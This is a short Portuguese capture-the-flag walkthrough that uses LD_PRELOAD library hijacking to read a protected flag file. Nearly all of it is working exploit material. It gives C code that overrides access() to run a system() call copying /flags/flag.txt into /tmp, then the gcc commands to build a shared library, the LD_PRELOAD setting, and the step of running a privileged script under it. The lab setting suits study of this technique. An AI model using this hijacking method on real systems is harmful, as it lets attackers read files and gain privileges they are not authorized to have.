Ir para tmp folder e criar lib.c:

```
#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

int access(const char *pathname, int mode){

      system("/usr/bin/cat /flags/flag.txt > /tmp/myfile.txt");

      return 0;
}
```


Dar permissões a lib.c:
`chmod 4755 lib.c`

Compilar:
`gcc -fPIC -g -c lib.c`

Criar a library:
`gcc -shared -o lib.so.1 lib.o -lc`

Criar env (cat > env) e colocar:
`LD_PRELOAD=/tmp/lib.so.1`

ir para a /home/flagreader correr:
`bash my_script.sh`

ir a tmp folder ver se existe myfile.txt e obter a flag

